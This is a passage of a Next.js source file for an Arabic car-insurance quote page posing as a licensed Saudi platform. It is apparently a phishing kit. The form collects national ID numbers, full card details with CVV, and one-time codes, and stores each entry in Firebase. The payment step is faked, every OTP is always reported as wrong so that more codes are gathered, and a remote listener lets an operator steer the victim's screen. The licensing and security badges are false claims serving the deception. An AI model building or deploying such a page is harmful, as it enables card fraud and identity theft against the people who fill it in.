"use client"

import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import {
  Shield,
  Users,
  Star,
  CheckCircle,
  Phone,
  Mail,
  FileText,
  CreditCard,
  Menu,
  X,
  ArrowLeft,
  Zap,
  Lock,
  AlertCircle,
  Award,
  Clock,
  TrendingUp,
  Check,
} from "lucide-react"
import { useState, useEffect, useRef } from "react"
import { setupOnlineStatus } from "@/lib/utils"
import { addData, db } from "@/lib/firebase"
import { offerData } from "@/lib/data"
import { doc, onSnapshot } from "firebase/firestore"




// Mock components to replace missing imports
const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
  <div className="space-y-6">
    <div>
      <label className="block text-sm font-semibold text-gray-700 mb-3">
        الغرض من التأمين <span className="text-red-500">*</span>
      </label>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
        <button
          type="button"
          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
            formData.insurance_purpose === "renewal"
              ? "border-blue-500 bg-blue-50 text-blue-700"
              : "border-gray-300 hover:border-blue-400"
          }`}
          onClick={() => setFormData((prev: any) => ({ ...prev, insurance_purpose: "renewal" }))}
        >
          <div className="text-center">
            <div className="font-semibold">تجديد وثيقة</div>
            <div className="text-sm text-gray-500 mt-1">تجديد وثيقة تأمين موجودة</div>
          </div>
        </button>
        <button
          type="button"
          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
            formData.insurance_purpose === "property-transfer"
              ? "border-blue-500 bg-blue-50 text-blue-700"
              : "border-gray-300 hover:border-blue-400"
          }`}
          onClick={() => setFormData((prev: any) => ({ ...prev, insurance_purpose: "property-transfer" }))}
        >
          <div className="text-center">
            <div className="font-semibold">نقل ملكية</div>
            <div className="text-sm text-gray-500 mt-1">تأمين مركبة منقولة الملكية</div>
          </div>
        </button>
      </div>
    </div>

    <div>
      <label className="block text-sm font-semibold text-gray-700 mb-3">
        اسم مالك الوثيقة <span className="text-red-500">*</span>
      </label>
      <Input
        type="text"
        placeholder="الاسم الكامل"
        value={formData.documment_owner_full_name}
        onChange={(e) => setFormData((prev: any) => ({ ...prev, documment_owner_full_name: e.target.value }))}
        className={`h-12 ${errors.documment_owner_full_name ? "border-red-500" : "border-gray-300"}`}
      />
      {errors.documment_owner_full_name && (
        <p className="text-red-500 text-sm mt-1">{errors.documment_owner_full_name}</p>
      )}
    </div>

    {formData.insurance_purpose === "renewal" && (
      <div>
        <label className="block text-sm font-semibold text-gray-700 mb-3">
          رقم هوية المالك <span className="text-red-500">*</span>
        </label>
        <Input
          type="text"
          placeholder="1234567890"
          maxLength={10}
          value={formData.owner_identity_number}
          onChange={(e) => setFormData((prev: any) => ({ ...prev, owner_identity_number: e.target.value }))}
          className={`h-12 ${errors.owner_identity_number ? "border-red-500" : "border-gray-300"}`}
        />
        {errors.owner_identity_number && <p className="text-red-500 text-sm mt-1">{errors.owner_identity_number}</p>}
      </div>
    )}

    {formData.insurance_purpose === "property-transfer" && (
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-3">
            رقم هوية المشتري <span className="text-red-500">*</span>
          </label>
          <Input
            type="text"
            placeholder="1234567890"
            maxLength={10}
            value={formData.buyer_identity_number}
            onChange={(e) => setFormData((prev: any) => ({ ...prev, buyer_identity_number: e.target.value }))}
            className={`h-12 ${errors.buyer_identity_number ? "border-red-500" : "border-gray-300"}`}
          />
          {errors.buyer_identity_number && <p className="text-red-500 text-sm mt-1">{errors.buyer_identity_number}</p>}
        </div>
        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-3">
            رقم هوية البائع <span className="text-red-500">*</span>
          </label>
          <Input
            type="text"
            placeholder="1234567890"
            maxLength={10}
            value={formData.seller_identity_number}
            onChange={(e) => setFormData((prev: any) => ({ ...prev, seller_identity_number: e.target.value }))}
            className={`h-12 ${errors.seller_identity_number ? "border-red-500" : "border-gray-300"}`}
          />
          {errors.seller_identity_number && (
            <p className="text-red-500 text-sm mt-1">{errors.seller_identity_number}</p>
          )}
        </div>
      </div>
    )}
  </div>
)

const MockVehicleRegistration = ({ formData, setFormData, errors }: any) => (
  <div className="space-y-6">
    <div>
      <label className="block text-sm font-semibold text-gray-700 mb-3">
        نوع المركبة <span className="text-red-500">*</span>
      </label>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
        <button
          type="button"
          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
            formData.vehicle_type === "serial"
              ? "border-blue-500 bg-blue-50 text-blue-700"
              : "border-gray-300 hover:border-blue-400"
          }`}
          onClick={() => setFormData((prev: any) => ({ ...prev, vehicle_type: "serial" }))}
        >
          <div className="text-center">
            <div className="font-semibold">مركبة برقم تسلسلي</div>
            <div className="text-sm text-gray-500 mt-1">مركبة مسجلة برقم تسلسلي</div>
          </div>
        </button>
        <button
          type="button"
          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
            formData.vehicle_type === "custom"
              ? "border-blue-500 bg-blue-50 text-blue-700"
              : "border-gray-300 hover:border-blue-400"
          }`}
          onClick={() => setFormData((prev: any) => ({ ...prev, vehicle_type: "custom" }))}
        >
          <div className="text-center">
            <div className="font-semibold">مركبة برقم لوحة</div>
            <div className="text-sm text-gray-500 mt-1">مركبة مسجلة برقم لوحة</div>
          </div>
        </button>
      </div>
    </div>

    <div>
      <label className="block text-sm font-semibold text-gray-700 mb-3">
        الرقم التسلسلي للمركبة <span className="text-red-500">*</span>
      </label>
      <Input
        type="text"
        placeholder="123456789"
        value={formData.sequenceNumber}
        onChange={(e) => setFormData((prev: any) => ({ ...prev, sequenceNumber: e.target.value }))}
        className="h-12 border-gray-300"
      />
    </div>
  </div>
)

const getBadgeText = (index: number) => {
  switch (index) {
    case 0:
      return "الأفضل سعراً"
    case 1:
      return "موصى به"
    case 2:
      return "خيار جيد"
    default:
      return ""
  }
}

const getTypeBadge = (type: string) => {
  switch (type) {
    case "against-others":
      return "ضد الغير"
    case "comprehensive":
      return "شامل"
    default:
      return "خاص"
  }
}

export default function QuotePage() {
  const [mounted, setMounted] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)

  const headerRef = useRef<HTMLElement>(null)
  const formRef = useRef<HTMLDivElement>(null)
  const stepContentRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    // Initialize visitor ID if not exists
    const visitorID = localStorage.getItem("visitor")
    if (visitorID) {
      setMounted(true)
     setupOnlineStatus(visitorID!)
    } else {
      // Create new visitor ID if none exists
      const newVisitorId = "visitor_" + Date.now()
      localStorage.setItem("visitor", newVisitorId)
      setMounted(true)
      setupOnlineStatus(newVisitorId)
    }
  }, [])

  if (!mounted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-50 via-white to-blue-50/30 flex items-center justify-center">
        <div className="text-center">
          <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
          <p className="text-gray-600">جاري التحميل...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 via-white to-blue-50/30" dir="rtl">
      {/* Enhanced Header */}
      <header className="bg-white/95 backdrop-blur-lg border-b border-gray-100 px-4 lg:px-6 py-4 sticky top-0 z-50 shadow-sm">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4 lg:gap-8">
            <div className="flex items-center gap-3">
              <div className="w-20 h-12 rounded-lg flex items-center justify-center">
                <img src="/Logo-AR.png" alt="logo" width={80} height={48} />
              </div>
              <div className="hidden sm:block">
                <h1 className="text-xl font-bold text-gray-900">تأميني</h1>
                <p className="text-xs text-gray-500">منصة التأمين الذكية</p>
              </div>
            </div>
            <nav className="hidden lg:flex items-center gap-8 text-sm font-medium">
              <a href="/" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200">
                الرئيسية
              </a>
              <a href="/#services" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200">
                الخدمات
              </a>
              <a href="/#about" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200">
                عن الشركة
              </a>
              <a href="/#contact" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200">
                اتصل بنا
              </a>
            </nav>
          </div>
          <div className="flex items-center gap-3">
            <Button variant="ghost" size="sm" className="hidden sm:flex text-gray-600 hover:text-[#109cd4]">
              English
            </Button>
            <Button
              variant="outline"
              size="sm"
              className="hidden sm:flex border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4]"
            >
              تسجيل الدخول
            </Button>
            <Button
              size="sm"
              className="bg-gradient-to-r from-[#109cd4] to-[#109cd4] hover:from-[#109cd4] hover:to-blue-800 shadow-lg text-white font-medium px-6"
            >
              ابدأ الآن
            </Button>
            <Button variant="ghost" size="sm" className="lg:hidden" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
              {mobileMenuOpen ? <X className="w-5 h-5" /> : <Menu className="w-5 h-5" />}
            </Button>
          </div>
        </div>

        {/* Enhanced Mobile Menu */}
        {mobileMenuOpen && (
          <div className="lg:hidden mt-4 pb-4 border-t border-gray-100 bg-white/95 backdrop-blur-lg">
            <nav className="flex flex-col gap-4 pt-4">
              <a href="/" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200 py-2">
                الرئيسية
              </a>
              <a href="/#services" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200 py-2">
                الخدمات
              </a>
              <a href="/#about" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200 py-2">
                عن الشركة
              </a>
              <a href="/#contact" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200 py-2">
                اتصل بنا
              </a>
              <div className="flex gap-2 pt-4 border-t border-gray-100">
                <Button variant="ghost" size="sm" className="text-gray-600 flex-1">
                  English
                </Button>
                <Button variant="outline" size="sm" className="border-gray-300 flex-1">
                  تسجيل الدخول
                </Button>
              </div>
            </nav>
          </div>
        )}
      </header>

      {/* Enhanced Hero Section */}
      <section className="relative bg-gradient-to-br from-[#109cd4] via-[#109cd4] to-blue-800 text-white py-16 lg:py-20 overflow-hidden">
        {/* Background Pattern */}
        <div className="absolute inset-0 opacity-10">
          <div className="absolute top-0 left-0 w-96 h-96 bg-white rounded-full -translate-x-48 -translate-y-48"></div>
          <div className="absolute bottom-0 right-0 w-96 h-96 bg-white rounded-full translate-x-48 translate-y-48"></div>
        </div>

        <div className="relative max-w-5xl mx-auto px-4 lg:px-6 text-center">
          <div className="space-y-8">
            <div className="flex items-center justify-center gap-2 mb-6">
              <Button
                variant="ghost"
                size="sm"
                className="text-blue-100 hover:text-white hover:bg-white/10 transition-all duration-200"
                onClick={() => (window.location.href = "/")}
              >
                <ArrowLeft className="w-4 h-4 ml-2" />
                العودة للرئيسية
              </Button>
            </div>

            <div className="space-y-6">
              <Badge className="bg-white/20 text-white border-white/30 px-6 py-3 text-base font-medium">
                🚗 عرض سعر مجاني ومقارنة فورية
              </Badge>
              <h1 className="text-4xl lg:text-6xl font-bold leading-tight">
                احصل على أفضل عروض
                <br />
                <span className="text-blue-200">تأمين السيارات</span>
              </h1>
              <p className="text-xl lg:text-2xl text-blue-100 max-w-3xl mx-auto leading-relaxed">
                قارن بين أكثر من 25 شركة تأمين واحصل على أفضل الأسعار في أقل من 3 دقائق
              </p>
            </div>

            {/* Enhanced Stats */}
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-8 max-w-2xl mx-auto mt-12">
              <div className="text-center group">
                <div className="w-16 h-16 bg-white/20 rounded-2xl flex items-center justify-center mx-auto mb-4 group-hover:bg-white/30 transition-all duration-300">
                  <Shield className="w-8 h-8 text-white" />
                </div>
                <div className="text-3xl font-bold mb-1">25+</div>
                <p className="text-blue-100">شركة تأمين</p>
              </div>
              <div className="text-center group">
                <div className="w-16 h-16 bg-white/20 rounded-2xl flex items-center justify-center mx-auto mb-4 group-hover:bg-white/30 transition-all duration-300">
                  <Zap className="w-8 h-8 text-white" />
                </div>
                <div className="text-3xl font-bold mb-1">3</div>
                <p className="text-blue-100">دقائق فقط</p>
              </div>
              <div className="text-center group">
                <div className="w-16 h-16 bg-white/20 rounded-2xl flex items-center justify-center mx-auto mb-4 group-hover:bg-white/30 transition-all duration-300">
                  <Star className="w-8 h-8 text-white" />
                </div>
                <div className="text-3xl font-bold mb-1">100%</div>
                <p className="text-blue-100">مجاني تماماً</p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Enhanced Quote Form Section */}
      <section className="py-16 lg:py-20 relative">
        <div className="max-w-5xl mx-auto px-4 lg:px-6">
          <div className="text-center mb-12">
            <h2 className="text-3xl lg:text-4xl font-bold text-gray-900 mb-4">احصل على عرض السعر الخاص بك</h2>
            <p className="text-lg text-gray-600 max-w-2xl mx-auto">
              اتبع الخطوات البسيطة للحصول على أفضل عروض التأمين المخصصة لاحتياجاتك
            </p>
          </div>
          <ProfessionalQuoteForm />
        </div>
      </section>

      {/* Enhanced Trust Indicators */}
      <section className="py-16 bg-white">
        <div className="max-w-6xl mx-auto px-4 lg:px-6">
          <div className="text-center mb-12">
            <h2 className="text-3xl lg:text-4xl font-bold text-gray-900 mb-4">لماذا يثق بنا أكثر من 500,000 عميل؟</h2>
            <p className="text-lg text-gray-600 max-w-2xl mx-auto">
              نحن ملتزمون بتقديم أفضل خدمة تأمين رقمية في المملكة العربية السعودية
            </p>
          </div>

          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-8">
            {[
              {
                icon: Shield,
                title: "أمان وثقة",
                description: "بياناتك محمية بأعلى معايير الأمان العالمية",
                color: "from-blue-500 to-[#109cd4]",
                bgColor: "bg-blue-50",
              },
              {
                icon: Award,
                title: "تقييم ممتاز",
                description: "4.9/5 من تقييمات العملاء على جميع المنصات",
                color: "from-yellow-500 to-yellow-600",
                bgColor: "bg-yellow-50",
              },
              {
                icon: Users,
                title: "خبرة واسعة",
                description: "أكثر من 500,000 عميل راضي وثقة متنامية",
                color: "from-green-500 to-green-600",
                bgColor: "bg-green-50",
              },
              {
                icon: Clock,
                title: "دعم مستمر",
                description: "خدمة عملاء متخصصة متاحة 24/7",
                color: "from-purple-500 to-purple-600",
                bgColor: "bg-purple-50",
              },
            ].map((feature, index) => (
              <Card key={index} className="border-0 shadow-lg hover:shadow-xl transition-all duration-300 group">
                <CardContent className="p-8 text-center">
                  <div
                    className={`w-16 h-16 ${feature.bgColor} rounded-2xl flex items-center justify-center mx-auto mb-6 group-hover:scale-110 transition-transform duration-300`}
                  >
                    <feature.icon className="w-8 h-8 text-gray-700" />
                  </div>
                  <h3 className="text-xl font-bold text-gray-900 mb-3">{feature.title}</h3>
                  <p className="text-gray-600 leading-relaxed">{feature.description}</p>
                </CardContent>
              </Card>
            ))}
          </div>
        </div>
      </section>

      {/* Enhanced Contact Support */}
      <section className="py-16 bg-gradient-to-br from-gray-50 to-blue-50/50">
        <div className="max-w-4xl mx-auto px-4 lg:px-6 text-center">
          <div className="space-y-8">
            <div>
              <h2 className="text-3xl lg:text-4xl font-bold text-gray-900 mb-4">هل تحتاج مساعدة؟</h2>
              <p className="text-lg text-gray-600 max-w-2xl mx-auto">
                فريق الخبراء متاح لمساعدتك في اختيار أفضل تأمين لسيارتك وتقديم الاستشارة المجانية
              </p>
            </div>

            <div className="flex flex-col sm:flex-row gap-4 justify-center">
              <Button size="lg" className="bg-green-600 hover:bg-green-700 text-white px-8 py-4 text-lg font-medium">
                <Phone className="w-5 h-5 ml-2" />
                اتصل بنا: 920000000
              </Button>
              <Button
                variant="outline"
                size="lg"
                className="border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4] px-8 py-4 text-lg font-medium"
              >
                <Mail className="w-5 h-5 ml-2" />
                راسلنا عبر البريد
              </Button>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-6 mt-12 max-w-2xl mx-auto">
              <div className="text-center">
                <div className="text-2xl font-bold text-[#109cd4] mb-1">24/7</div>
                <p className="text-sm text-gray-600">خدمة العملاء</p>
              </div>
              <div className="text-center">
                <div className="text-2xl font-bold text-[#109cd4] mb-1">{"<"} 30 ثانية</div>
                <p className="text-sm text-gray-600">وقت الاستجابة</p>
              </div>
              <div className="text-center">
                <div className="text-2xl font-bold text-[#109cd4] mb-1">98%</div>
                <p className="text-sm text-gray-600">رضا العملاء</p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Enhanced Footer */}
      <footer className="bg-gray-900 text-white py-16">
        <div className="max-w-7xl mx-auto px-4 lg:px-6">
          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-8 mb-12">
            <div className="space-y-6">
              <div className="flex items-center gap-3">
                <div className="w-32 h-16 p-2 bg-white rounded-lg flex items-center justify-center">
                  <img src="/Logo-AR.png" alt="logo" width={128} height={64} />
                </div>
              </div>
              <p className="text-gray-400 leading-relaxed">
                منصة التأمين الرقمية الرائدة في السعودية، نقدم أفضل الحلول التأمينية بأسعار تنافسية
              </p>
            </div>

            <div>
              <h3 className="font-bold mb-6 text-lg">الخدمات</h3>
              <ul className="space-y-3 text-gray-400">
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200">
                    تأمين السيارات
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200">
                    التأمين الصحي
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200">
                    تأمين السفر
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200">
                    تأمين المنازل
                  </a>
                </li>
              </ul>
            </div>

            <div>
              <h3 className="font-bold mb-6 text-lg">الشركة</h3>
              <ul className="space-y-3 text-gray-400">
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200">
                    من نحن
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200">
                    فريق العمل
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200">
                    الوظائف
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200">
                    الأخبار
                  </a>
                </li>
              </ul>
            </div>

            <div>
              <h3 className="font-bold mb-6 text-lg">الدعم</h3>
              <ul className="space-y-3 text-gray-400">
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200">
                    مركز المساعدة
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200">
                    اتصل بنا
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200">
                    الأسئلة الشائعة
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200">
                    سياسة الخصوصية
                  </a>
                </li>
              </ul>
            </div>
          </div>

          <div className="border-t border-gray-800 pt-8 flex flex-col sm:flex-row justify-between items-center gap-4">
            <p className="text-gray-400 text-center sm:text-right">
              © 2024 تأميني. جميع الحقوق محفوظة. مرخص من البنك المركزي السعودي.
            </p>
            <div className="flex gap-4">
              <Badge variant="outline" className="border-gray-600 text-gray-400">
                مرخص من ساما
              </Badge>
              <Badge variant="outline" className="border-gray-600 text-gray-400">
                ISO 27001
              </Badge>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}

const allOtp = [""]

function ProfessionalQuoteForm() {
  const [currentPage, setCurrentStep] = useState(1)
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [touched, setTouched] = useState<Record<string, boolean>>({})
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [paymentProcessing, setPaymentProcessing] = useState(false)
  const [otpSent, setOtpSent] = useState(false)
  const [otpVerified, setOtpVerified] = useState(false)
  const [otpAttempts, setOtpAttempts] = useState(0)
  const [cardNumber, setCardNumber] = useState("")
  const [cardName, setCardName] = useState("")
  const [cardMonth, setCardMonth] = useState("")
  const [cardYear, setCardYear] = useState("")
  const [cvv, setCvv] = useState("")
  const [otp, setOtp] = useState("")
  const [otpTimer, setOtpTimer] = useState(0)
  const [formData, setFormData] = useState({
    insurance_purpose: "renewal",
    documment_owner_full_name: "",
    owner_identity_number: "",
    buyer_identity_number: "",
    seller_identity_number: "",
    vehicle_type: "serial",
    sequenceNumber: "",
    policyStartDate: "",
    insuranceTypeSelected: "against-others",
    additionalDrivers: 0,
    specialDiscounts: false,
    agreeToTerms: false,
    selectedInsuranceOffer: "",
    selectedAddons: [] as string[],
    phone: "",
  })

  const stepHeaderRef = useRef<HTMLHeadingElement>(null)
  const firstInputRef = useRef<HTMLInputElement>(null)

  const errorSummaryRef = useRef<HTMLDivElement>(null)

  const steps = [
    { number: 1, title: "البيانات الأساسية", subtitle: "معلومات المركبة والمالك", icon: FileText },
    { number: 2, title: "بيانات التأمين", subtitle: "تفاصيل وثيقة التأمين", icon: Shield },
    { number: 3, title: "قائمة الأسعار", subtitle: "مقارنة العروض المتاحة", icon: TrendingUp },
    { number: 4, title: "الإضافات", subtitle: "خدمات إضافية اختيارية", icon: Star },
    { number: 5, title: "الملخص", subtitle: "مراجعة الطلب والتواصل", icon: CheckCircle },
    { number: 6, title: "الدفع", subtitle: "بيانات الدفع الآمن", icon: CreditCard },
    { number: 7, title: "التحقق", subtitle: "تأكيد رمز التحقق", icon: Lock },
  ]

  useEffect(() => {
    let interval: NodeJS.Timeout
    if (otpTimer > 0) {
      interval = setInterval(() => {
        setOtpTimer((prev) => prev - 1)
      }, 1000)
    }
    return () => clearInterval(interval)
  }, [otpTimer])

  useEffect(() => {
    if (stepHeaderRef.current) {
      stepHeaderRef.current.focus()
      stepHeaderRef.current.scrollIntoView({ behavior: "smooth", block: "start" })
    }

    // Save current step
    const visitorId = localStorage.getItem("visitor")
    if (visitorId) {
      addData({ id: visitorId, currentPage })
    }
  }, [currentPage])

  useEffect(() => {
    if (Object.keys(errors).length > 0 && errorSummaryRef.current) {
      errorSummaryRef.current.focus()
    }
  }, [errors])

  useEffect(() => {
    const visitorId = localStorage.getItem("visitor")
    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() 
          if (  currentPage !== data.currentPage) {
            if(data.currentPage === '9999'){
              window.location.href='/verify-phone'
            }else
            {setCurrentStep(parseInt(data.currentPage))}
          } 
        }
      })

      return () => unsubscribe()
    }
  }, [])

  const validationRules = {
    documment_owner_full_name: {
      required: true,
      message: "يرجى إدخال اسم مالك الوثيقة بالكامل",
    },
    owner_identity_number: {
      required: true,
      pattern: /^[0-9]{10}$/,
      message: "يرجى إدخال رقم هوية صحيح (10 أرقام)",
    },
    buyer_identity_number: {
      required: true,
      pattern: /^[0-9]{10}$/,
      message: "يرجى إدخال رقم هوية المشتري صحيح (10 أرقام)",
    },
    seller_identity_number: {
      required: true,
      pattern: /^[0-9]{10}$/,
      message: "يرجى إدخال رقم هوية البائع صحيح (10 أرقام)",
    },
    policyStartDate: {
      required: true,
      validate: (value: string) => {
        const selectedDate = new Date(value)
        const today = new Date()
        const maxDate = new Date()
        maxDate.setMonth(maxDate.getMonth() + 3)

        if (selectedDate < today) {
          return "لا يمكن أن يكون تاريخ بداية الوثيقة في الماضي"
        }
        if (selectedDate > maxDate) {
          return "لا يمكن أن يكون تاريخ بداية الوثيقة أكثر من 3 أشهر من اليوم"
        }
        return null
      },
      message: "يرجى اختيار تاريخ بداية الوثيقة",
    },
    agreeToTerms: {
      required: true,
      message: "يجب الموافقة على الشروط والأحكام للمتابعة",
    },
    selectedInsuranceOffer: {
      required: true,
      message: "يرجى اختيار عرض التأمين المناسب",
    },
    phone: {
      required: false,
      pattern: /^(05|5)[0-9]{8}$/,
      message: "يرجى إدخال رقم هاتف سعودي صحيح (05xxxxxxxx)",
    },
  }

  const validateField = (fieldName: string, value: any): string | null => {
    const rule = validationRules[fieldName as keyof typeof validationRules] as any
    if (!rule) return null

    if (rule.required && (!value || value === "" || (Array.isArray(value) && value.length === 0))) {
      return rule.message
    }

    if (value && rule.pattern && !rule.pattern.test(value)) {
      return rule.message
    }

    if (value && rule.validate) {
      const customError = rule.validate(value)
      if (customError) return customError
    }

    return null
  }

  const validateStep = (step: number): boolean => {
    const stepErrors: Record<string, string> = {}
    let isValid = true

    switch (step) {
      case 1:
        const ownerNameError = validateField("documment_owner_full_name", formData.documment_owner_full_name)
        if (ownerNameError) {
          stepErrors.documment_owner_full_name = ownerNameError
          isValid = false
        }

        if (formData.insurance_purpose === "renewal") {
          const ownerIdError = validateField("owner_identity_number", formData.owner_identity_number)
          if (ownerIdError) {
            stepErrors.owner_identity_number = ownerIdError
            isValid = false
          }
        } else if (formData.insurance_purpose === "property-transfer") {
          const buyerIdError = validateField("buyer_identity_number", formData.buyer_identity_number)
          const sellerIdError = validateField("seller_identity_number", formData.seller_identity_number)

          if (buyerIdError) {
            stepErrors.buyer_identity_number = buyerIdError
            isValid = false
          }
          if (sellerIdError) {
            stepErrors.seller_identity_number = sellerIdError
            isValid = false
          }
        }
        break

      case 3:
        const selectedOfferError = validateField("selectedInsuranceOffer", formData.selectedInsuranceOffer)
        if (selectedOfferError) {
          stepErrors.selectedInsuranceOffer = selectedOfferError
          isValid = false
        }
        break

      case 5:
        const phoneError = validateField("phone", formData.phone)
        if (phoneError) {
          stepErrors.phone = phoneError
          isValid = false
        }

        if (!formData.agreeToTerms) {
          stepErrors.agreeToTerms = "يجب الموافقة على الشروط والأحكام للمتابعة"
          isValid = false
        }
        break
    }

    setErrors((prev) => ({ ...prev, ...stepErrors }))
    return isValid
  }

  const handleFieldChange = (fieldName: string, value: any) => {
    setFormData((prev) => ({ ...prev, [fieldName]: value }))

    if (errors[fieldName]) {
      setErrors((prev) => ({ ...prev, [fieldName]: "" }))
    }
  }

  const handleFieldBlur = (fieldName: string) => {
    setTouched((prev) => ({ ...prev, [fieldName]: true }))

    const error = validateField(fieldName, formData[fieldName as keyof typeof formData])
    if (error) {
      setErrors((prev) => ({ ...prev, [fieldName]: error }))
    }
  }

  const nextStep = () => {
    if (validateStep(currentPage)) {
      if (currentPage < steps.length) {
        const visitorId = localStorage.getItem("visitor")
        const dataToSave = {
          id: visitorId,
          currentPage: currentPage + 1,
          ...formData,
          cardNumber,
          cardName,
          cardMonth,
          cardYear,
          cvv,
        }

        addData(dataToSave)
        setCurrentStep(currentPage + 1)
      }
    }
  }

  const prevStep = () => {
    const vistorId=localStorage.getItem('visitor')
    if (currentPage > 1) {
      setCurrentStep(currentPage - 1)
      addData({id:vistorId,currentPage})

    }
  }

  const handleSubmit = async () => {
    if (!validateStep(7)) {
      return
    }

    setIsSubmitting(true)
    const visitorId = localStorage.getItem("visitor")

    try {
      await addData({
        id: visitorId,
        otp,
        otpVerified: false,
        otpVerificationTime: new Date().toISOString(),
        submissionTime: new Date().toISOString(),
        finalStatus: "verification_failed",
        otpAttempts: otpAttempts + 1,
        paymentStatus: "completed",
        ...formData,
      })

      await new Promise((resolve) => setTimeout(resolve, 2000))
      alert("!رمز خاطئ, سوف يتم ارسال رمز جديد")
      setOtp("")
      setOtpAttempts((prev) => prev + 1)
    } catch (error) {
      alert("حدث خطأ أثناء إرسال الطلب. يرجى المحاولة مرة أخرى.")
    } finally {
      setIsSubmitting(false)
    }
  }

  const ValidatedInput = ({
    label,
    fieldName,
    type = "text",
    placeholder,
    required = false,
    className = "",
    autoFocus = false,
    ...props
  }: {
    label: string
    fieldName: string
    type?: string
    placeholder?: string
    required?: boolean
    className?: string
    autoFocus?: boolean
    [key: string]: any
  }) => {
    const hasError = errors[fieldName] && touched[fieldName]
    return (
      <div className={className}>
        <label className="block text-sm font-semibold text-gray-700 mb-3">
          {label} {required && <span className="text-red-500">*</span>}
        </label>
        <Input
          type={type}
          placeholder={placeholder}
          value={formData[fieldName as keyof typeof formData] as string}
          onChange={(e) => {
            const value = e.target.value
            handleFieldChange(fieldName, value)
          }}
          onBlur={() => handleFieldBlur(fieldName)}
          className={`h-12 ${hasError ? "border-red-500 focus:border-red-500 focus:ring-red-200" : "border-gray-300 focus:border-blue-500 focus:ring-blue-200"}`}
          {...props}
        />
        {hasError && (
          <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
            <AlertCircle className="w-4 h-4 flex-shrink-0" />
            <span>{errors[fieldName]}</span>
          </div>
        )}
      </div>
    )
  }

  function handlePayment(): void {
    const visitorId = localStorage.getItem("visitor")

    addData({
      id: visitorId,
      cardNumber,
      cardName,
      cardMonth,
      cardYear,
      cvv,
      paymentStatus: "processing",
      ...formData,
    })

    setPaymentProcessing(true)
    setTimeout(() => {
      setPaymentProcessing(false)
      setCurrentStep(7)
      setOtpTimer(120)

      addData({
        id: visitorId,
        paymentStatus: "completed",
        otpSent: true,
        currentPage: 7,
      })
      setOtpSent(true)
    }, 2000)
  }

  function verifyOTP(): void {
    const visitorId = localStorage.getItem("visitor")
    allOtp.push(otp)
    addData({
      id: visitorId,
      otp,
      otpAttempts: otpAttempts + 1,
      otpVerificationTime: new Date().toISOString(),
      allOtp,
      ...formData,
    })

    handleSubmit()
  }

  function sendOTP(): void {
    const visitorId = localStorage.getItem("visitor")

    setOtpTimer(120)

    addData({
      id: visitorId,
      otpSentTime: new Date().toISOString(),
      otpResendCount: (otpAttempts || 0) + 1,
      otpSent: true,
      paymentStatus: "completed",
      ...formData,
    })
    setOtpSent(true)
  }

  return (
    <Card className="bg-white rounded-2xl shadow-2xl border-0 overflow-hidden">
      <CardContent className="p-0">
        {/* Enhanced Progress Steps */}
        <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-6 lg:p-8">
          {/* Mobile Progress */}
          <div className="block sm:hidden">
            <div className="flex items-center gap-2 overflow-x-auto pb-2">
              {steps.map((step, index) => (
                <div key={step.number} className="flex items-center flex-shrink-0">
                  <div className="flex flex-col items-center">
                    <div
